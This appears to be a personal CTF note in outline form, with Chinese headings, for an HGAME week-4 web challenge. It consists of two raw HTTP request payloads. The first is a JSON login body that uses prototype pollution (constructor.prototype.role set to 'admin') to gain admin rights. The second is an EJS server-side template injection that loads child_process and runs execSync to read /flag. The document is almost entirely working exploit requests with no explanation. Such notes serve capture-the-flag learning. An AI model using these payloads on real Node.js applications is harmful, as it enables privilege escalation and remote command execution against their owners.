- # 原型链污染
	- [[CTF/JS/原型链污染]]
	- payload
		- ```http
		  POST /login HTTP/1.1
		  Host: week-4.hgame.lwsec.cn:30052
		  Content-Length: 88
		  Cache-Control: max-age=0
		  Upgrade-Insecure-Requests: 1
		  Origin: http://week-4.hgame.lwsec.cn:30052
		  Content-Type: application/json
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		  Referer: http://week-4.hgame.lwsec.cn:30052/login
		  Accept-Encoding: gzip, deflate
		  Accept-Language: en-US,en;q=0.9
		  Cookie: session=s%3A5xIDo7I-fsq9AMb-jXdy9fb9-Rj3iT9C.G7VOUI1cvglTSaduhuuxOYl%2FH65pfSFmV2iV59GzsPw
		  Connection: close
		  
		  {"username":"admin","password":"idontknow","constructor":{"prototype":{"role":"admin"}}}
		  ```
- # EJS SSTI
	- payload
		- ```http
		  POST / HTTP/1.1
		  Host: week-4.hgame.lwsec.cn:30052
		  Content-Length: 99
		  Cache-Control: max-age=0
		  Upgrade-Insecure-Requests: 1
		  Origin: http://week-4.hgame.lwsec.cn:30052
		  Content-Type: application/x-www-form-urlencoded
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		  Referer: http://week-4.hgame.lwsec.cn:30052/
		  Accept-Encoding: gzip, deflate
		  Accept-Language: en-US,en;q=0.9
		  Cookie: session=s%3A5xIDo7I-fsq9AMb-jXdy9fb9-Rj3iT9C.G7VOUI1cvglTSaduhuuxOYl%2FH65pfSFmV2iV59GzsPw
		  Connection: close
		  
		  diary=<%25%3dglobal.process.mainModule.constructor._load('child_process').execSync("cat+/flag")%25>
		  ```